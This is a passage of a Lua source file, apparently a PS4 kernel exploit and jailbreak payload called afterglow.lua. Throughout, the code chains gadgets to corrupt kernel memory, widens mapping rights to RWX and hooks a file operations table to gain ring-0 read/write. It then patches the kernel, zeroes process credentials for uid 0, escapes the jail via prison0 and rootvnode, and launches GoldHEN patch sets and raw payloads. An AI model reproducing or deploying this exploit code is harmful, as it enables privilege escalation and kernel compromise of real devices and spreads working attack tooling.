            c:load_rax(src)
            c:follow(8)
        end
    end

    local r2 = shot:take(function(c)
        c:slot(kat(K.swap_rbp))
        c:save_rax(note)
        c:slot(kat(K.swap_rbp))
        c:load_rax(note)
        c:follow(0)
        c:follow(-0x148)
        c:save_rax(note + 8)
        c:follow(8)
        c:save_rax(note + 16)
        c:follow(0x48)
        c:follow(0)
        c:follow(probe_fd * 8)
        c:save_rax(note + 40)
        c:follow_rax(8)
        c:save_rax(note + 48)
        c:copy_from_rax(ftab, 0x58)
    end, 0x1000)

    local nd = AG.rdbuf(note, 128)
    local file = qw(nd, 40)
    local ops = qw(nd, 48)
    log("[3] chain=%s file=%s ops=%s",
        r2 == nil and ("null -- " .. tostring(shot.why)) or tostring(r2),
        hexaddr(file), hexaddr(ops))
    if not in_heap(file) or not in_text(ops) then
        warn("    handles implausible -- nothing written")
        STATE.retry = true
        return false
    end

    local sane = 0
    local ft = AG.rdbuf(ftab, 0x58)
    for k = 0, 9 do
        if in_text(qw(ft, k * 8)) then sane = sane + 1 end
    end
    if sane < 6 then
        warn("    operation table unusable, %d of 10", sane)
        return false
    end

    log("[3b] entering shot (ft=%s sane=%d)", hexaddr(ftab), sane)
    local r2b = shot:take(function(c)
        c:slot(kat(K.swap_rbp))
        c:save_rax(note)
        c:slot(kat(K.swap_rbp))
        c:load_rax(note)
        c:follow(0)
        c:follow(-0x148)
        c:follow(8)
        c:follow(0x168)
        c:follow(8)
        walk_loop(c)
    end, reach * math.floor(TUNE.stride / 8) * 64 + 0x2000)
    log("[3b] address space walked, chain=%s", tostring(r2b))
    if not ran(r2b) then
        warn("    the chain did not run -- the hole was refilled with a real object")
        STATE.retry = true
        return false
    end

    local md = AG.rdbuf(maps, reach * TUNE.stride)
    local hit, walked = nil, 0
    for k = 0, reach - 1 do
        local from = qw(md, k * TUNE.stride + 0x20)
        local upto = qw(md, k * TUNE.stride + 0x28)
        if zero(from) and zero(upto) then break end

        if (upto.h - from.h) > 0x100 then break end
        walked = k + 1
        local page = room.page
        if (from.h < page.h or (from.h == page.h and from.l <= page.l))
            and (page.h < upto.h or (page.h == upto.h and page.l < upto.l)) then
            hit = k
            break
        end
    end
    if hit == nil then
        warn("[4] no mapping covers the room, %d walked", walked)
        return false
    end
    if hit == 0 then
        warn("[4] the room is in the first mapping -- cannot address it")
        return false
    end

    local rights = memory.read_dword(maps + hit * TUNE.stride + 0x5c):tonumber()
    local locked = memory.read_dword(maps + hit * TUNE.stride + 0x88):tonumber()
    local here = qw(md, (hit - 1) * TUNE.stride + 0x08)
    local now, ceiling = rights % 256, math.floor(rights / 256) % 256

    log("[4] mapping %d at %s rights=0x%x ceiling=0x%x", hit, hexaddr(here), now, ceiling)
    if (locked % 2) == 1 or not in_heap(here) or now == 0 or ceiling == 0
        or math.floor(now / 4) % 2 ~= 1 then
        warn("    not the mapping we want -- nothing written")
        return false
    end

    local widened = rights
    if math.floor(widened / 0x200) % 2 == 0 then widened = widened + 0x200 end

    local wRights = AG.alloc(16)
    AG.wr4(wRights, widened)
    local wTable = AG.alloc(16)
    AG.wr8(wTable, ftab)
    AG.wr8(ftab + 0x18, room.free)

    local r3 = shot:take(function(c)
        c:put_dword(here + 0x5c, widened)
        c:put_const(file + 0x08, ftab)
    end)
    log("[5] widen and hook: %s",
        r3 == nil and ("null -- " .. tostring(shot.why)) or tostring(r3))
    if not ran(r3) then
        warn("    chain did not run -- kernel untouched")
        STATE.retry = true
        return false
    end

    if i32(syscall.mprotect(room.page, ROOM_SIZE, 7)) ~= 0 then
        warn("    page did not turn writable -- not calling into it")
        return false
    end

    local boot = hex_to_binary(BOOTSTRAP)
    AG.wrbuf(room.free, boot)
    if AG.rdbuf(room.free, #boot) ~= boot then
        warn("    bootstrap did not stick")
        return false
    end

    local m1 = syscall.mmap(0, 0x4000, 3, 0x1002, -1, 0)
    local before = i32(syscall.mprotect(m1, 0x4000, 7))
    i32(syscall.ioctl(probe_fd, 0xC0086101, AG.alloc(64)))
    local m2 = syscall.mmap(0, 0x4000, 3, 0x1002, -1, 0)
    local after = i32(syscall.mprotect(m2, 0x4000, 7))

    local k = AG.open_ring0(room.free)
    AG.attach_teardown_loops(k, room.free)

    local thread = nil
    if before ~= 0 and after == 0 then
        thread = k.thread()
    end
    local gated = thread ~= nil and in_heap(thread)

    if not (gated and k.write_v(file + 0x08, ops)) then
        local wOld = AG.alloc(16)
        AG.wr8(wOld, ops)
        shot:take(function(c) c:put(file + 0x08, wOld, 8) end)
    end
    syscall.close(probe_fd)

    if before == 0 or after ~= 0 then
        warn("[6] kernel unchanged, rwx %d before and %d after -- %d shots used",
            before, after, shot.fired)
        return false
    end
    log("[6] kernel patched, rwx is open -- %d shots used", shot.fired)
    AG.on_screen("ring 0 open")

    if not gated then
        warn("[7] the gate did not answer")
        return false
    end
    local base2 = k.base()
    if not base2 or not same(base2, kbase) then
        warn("[7] the gate reports %s, the leak said %s",
            base2 and hexaddr(base2) or "nothing", hexaddr(kbase))
        return false
    end
    log("[7] gate is live, thread %s", hexaddr(thread))

    local function fail_out(msg)
        warn("%s", msg)
        AG.on_screen("stopped: " .. tostring(msg))
        local ok, err = pcall(function()
            local p0 = k.read_v(thread + 0x08)
            local f0 = p0 and k.read_v(p0 + 0x48)
            local o0 = f0 and k.read_v(f0)
            if o0 and in_heap(o0)
                and AG.teardown(k, kbase, o0, shot.devs, shot.queues, room.free) then
                log("handles defused after the failure -- this process may exit")
            else
                warn("the handles are NOT defused -- do not let this process exit, cold boot instead")
            end
        end)
        if not ok then warn("teardown threw: %s", tostring(err)) end
        return false
    end

    if not k.apply(kbase, PATCHES) then
        return fail_out("[8] the patch pass did not return")
    end

    local done, failed = 0, nil
    for _, p in ipairs(PATCHES) do
        local bytes = hex_to_binary(p[2])
        local got = k.read(kat(p[1]), #bytes)
        if got and got == bytes then done = done + 1 else failed = failed or p[3] end
    end
    log("[8] %d of %d kernel patches in place%s", done, #PATCHES,
        failed and (" -- first missing: " .. failed) or "")
    if done < #PATCHES then
        return fail_out("     refusing to go on with a half patched kernel")
    end

    local proc = k.read_v(thread + 0x08)
    local fdt = proc and k.read_v(proc + 0x48)
    local ofs = fdt and k.read_v(fdt)
    if not ofs or not in_heap(ofs) then
        return fail_out("[9] descriptor table unreadable")
    end

    local ucred = proc and k.read_v(proc + 0x40)
    if not ucred or not in_heap(ucred) then
        return fail_out("[9] no credentials")
    end

    local z4 = string.rep("\0", 4)
    for _, off in ipairs({ 0x04, 0x08, 0x0c, 0x14 }) do
        k.write(ucred + off, z4)
    end
    k.write(ucred + 0x10, "\1\0\0\0")

    local prison0 = k.read_v(kat(K.prison0))
    if not prison0 or not in_text(prison0) then
        return fail_out(string.format("[9] prison0 pointer is %s -- not touching credentials",
            prison0 and hexaddr(prison0) or "unreadable"))
    end
    k.write_v(ucred + 0x30, prison0)
    k.write(ucred + 0x60, string.rep(string.char(255), 16))

    local rootvnode = k.read_v(kat(K.rootvnode))
    if not rootvnode or not in_heap(rootvnode) then
        return fail_out("[9] rootvnode is not set")
    end
    k.write_v(fdt + 0x10, rootvnode)
    k.write_v(fdt + 0x18, rootvnode)

    if i32(syscall.getuid()) ~= 0 then
        return fail_out("[9] still not root")
    end
    log("[9] jailbroken, uid 0")
    AG.on_screen("jailbroken, uid 0")

    local iface = {
        base = kbase,
        curproc = proc,
        curproc_fd = fdt,
        curproc_ofiles = ofs,
        thread = thread,
        devs = shot.devs,
        queues = shot.queues,
        gate = k,
        room = room.free,
    }

    function iface.read(at, len)
        local out = {}
        local got = 0
        while got < len do
            local n = math.min(len - got, STAGE_MAX)
            local s = k.read(U(at) + got, n)
            if not s then return nil end
            table.insert(out, s)
            got = got + n
        end
        return table.concat(out)
    end

    function iface.write(at, bytes)
        local done2 = 0
        while done2 < #bytes do
            local n = math.min(#bytes - done2, STAGE_MAX)
            if not k.write(U(at) + done2, bytes:sub(done2 + 1, done2 + n)) then return false end
            done2 = done2 + n
        end
        return true
    end

    function iface.read8(at) return k.read_v(at) end
    function iface.write8(at, q) return k.write_v(at, q) end
    iface.data_base = kbase

    AG.iface = iface
    AG.kbase = kbase
    AG.thread = thread

    kernel.read_buffer = function(at, len) return iface.read(at, uint64(len):tonumber()) end
    kernel.write_buffer = function(at, buf) return iface.write(at, buf) end
    kernel.addr = kernel.addr or {}
    kernel.addr.data_base = kbase
    kernel.addr.curproc = proc
    kernel.addr.curproc_fd = fdt
    kernel.addr.curproc_ofiles = ofs
    kernel.addr.thread = thread
    kernel.rw_initialized = true
    kernel.is_ps4_kpatches_applied = true

    pcall(update_kernel_offsets)

    log("[10] kernel interface is live -- %d handles held open", #shot.devs)

    if AG.cfg.apply_patchset then
        AG.run_patchset(k, room, fw)
    end

    iface.defused = AG.teardown(k, kbase, ofs, shot.devs, shot.queues, room.free)
    log(iface.defused and "handles defused -- this process may exit"
        or "the handles are NOT defused -- do not let this process exit")

    if AG.cfg.payload_path then
        iface.payload = AG.run_payload_file(AG.cfg.payload_path)
    end

    log("done -- jailbroken, rwx open, syscall 11 is a kexec gate%s",
        iface.payload and ", enabler running" or "")
    AG.on_screen(iface.defused and "done, handles defused" or "done, handles NOT defused")

    return iface
end

function AG.run_patchset(k, room, fw)
    local hexstr = PATCHSET_HEX[fw]

    if type(AG.cfg.apply_patchset) == "string" then
        local ok, data = pcall(file_read, AG.cfg.apply_patchset, "rb")
        if ok and data and #data > 0 then hexstr = bin_to_hex(data) end
    end

    if not hexstr or #hexstr == 0 then
        local p = "/data/patchset-" .. tostring(fw):gsub("%.", "") .. ".bin"
        local ok, data = pcall(file_read, p, "rb")
        if ok and data and #data > 0 then hexstr = bin_to_hex(data) end
    end

    if not hexstr or #hexstr == 0 then
        warn("[g] no patch set for firmware %s -- GoldHEN will not be started without it", tostring(fw))
        return false
    end

    local blob = hex_to_binary(hexstr)
    if #blob > 0x400 - BODY then
        warn("[g] the patch set does not fit in the body area")
        return false
    end

    AG.wrbuf(room.free + BODY, blob)
    if AG.rdbuf(room.free + BODY, #blob) ~= blob then
        warn("[g] the patch set did not stick")
        return false
    end

    k.exec(room.free + BODY)
    log("[g] [0] kernel patch set, %d bytes from the libc tail", #blob)

    local sites = AG.patchset_sites(blob)
    local okc, bad = 0, nil
    for _, s in ipairs(sites) do
        local got = k.read(k.base() + s.disp, #s.bytes)
        if got == s.bytes then okc = okc + 1 else bad = bad or s end
    end
    if #sites > 0 then
        log("[g] %d of %d immediate-form sites verified%s", okc, #sites,
            bad and string.format(" -- first miss at +0x%x", bad.disp) or "")
    end
    return true
end

local function rd32(str, pos)
    local a, b, c, d = str:byte(pos), str:byte(pos + 1), str:byte(pos + 2), str:byte(pos + 3)
    if not (a and b and c and d) then return nil end
    return a + b * 0x100 + c * 0x10000 + d * 0x1000000
end

function AG.patchset_sites(blob)
    local sites = {}
    local i = 1
    local n = #blob
    while i <= n - 6 do
        local b1, b2, b3 = blob:byte(i), blob:byte(i + 1), blob:byte(i + 2)
        if b1 == 0xc6 and b2 == 0x81 then
            local disp = rd32(blob, i + 2)
            if disp then
                table.insert(sites, { disp = disp, bytes = blob:sub(i + 6, i + 6) })
                i = i + 7
            else i = i + 1 end
        elseif b1 == 0x66 and b2 == 0xc7 and b3 == 0x81 then
            local disp = rd32(blob, i + 3)
            if disp then
                table.insert(sites, { disp = disp, bytes = blob:sub(i + 7, i + 8) })
                i = i + 9
            else i = i + 1 end
        elseif b1 == 0xc7 and b2 == 0x81 then
            local disp = rd32(blob, i + 2)
            if disp then
                table.insert(sites, { disp = disp, bytes = blob:sub(i + 6, i + 9) })
                i = i + 10
            else i = i + 1 end
        else
            i = i + 1
        end
    end
    return sites
end

function AG.run_payload_file(path)
    local ok, data = pcall(file_read, path, "rb")
    if not ok or not data or #data == 0 then
        warn("[p] cannot read %s", path)
        return false
    end
    if data:byte(1) ~= 0xE9 then
        warn("[p] %s does not start with a jmp -- not a raw payload, refusing", path)
        return false
    end

    local size = math.floor((#data + 0x3FFF) / 0x4000) * 0x4000
    local m = syscall.mmap(0, size, 7, 0x1002, -1, 0)
    if m:tonumber() == -1 then
        warn("[p] mmap rwx failed, errno %s", errno_str())
        return false
    end

    AG.wrbuf(m, data)
    if AG.rdbuf(m, #data) ~= data then
        warn("[p] copy mismatch -- not started")
        return false
    end

    local thr = AG.alloc(8)
    local Thrd_create = fcall(libc_addrofs.Thrd_create)
    local rc = Thrd_create(thr, m):tonumber()
    local started = rc == 0 and not zero(AG.rd8(thr))
    log("[p] %d bytes at %s, thread rc=%d%s", #data, hexaddr(m), rc,
        started and " -- running" or " -- did NOT start")
    return started
end

function AG.run(opts)
    opts = opts or {}
    local max = opts.tries or 4
    for n = 1, max do
        local r = AG.attempt(opts)
        if r then
            if type(r) == "table" and r.idle then return r end
            return r
        end
        if not STATE.retry then return false end
        if n == max then
            warn("gave up after %d attempts", n)
            return false
        end
        warn("attempt %d fell short -- going again", n)
        pcall(sleep, 0.4)
    end
    return false
end

local function main()
    log("afterglow.lua %s -- mode %s", AG.version, tostring(AG.cfg.mode))

    if PLATFORM ~= "ps4" then
        warn("this payload targets ps4 only (platform is %s)", tostring(PLATFORM))
        return
    end
    if not native_invoke then
        warn("arbitrary r/w is not available -- this payload needs the loader running")
        return
    end

    local ok, err = pcall(function()
        if AG.cfg.mode == "probe" then
            AG.probe()
        elseif AG.cfg.mode == "gate" then
            AG.gate_selftest()
        elseif AG.cfg.mode == "elf" then
            AG.elf_selftest()
        elseif AG.cfg.mode == "kexec" then
            AG.kexec_payload()
        elseif AG.cfg.mode == "flat" then
            AG.kexec_flat()
        elseif AG.cfg.mode == "listen" then
            AG.listen_payload()
        elseif AG.cfg.mode == "goldhen" then
            AG.goldhen_install()
        else
            AG.run()
        end
    end)

    if not ok then
        warn("threw: %s", tostring(err))
    end
end

main()
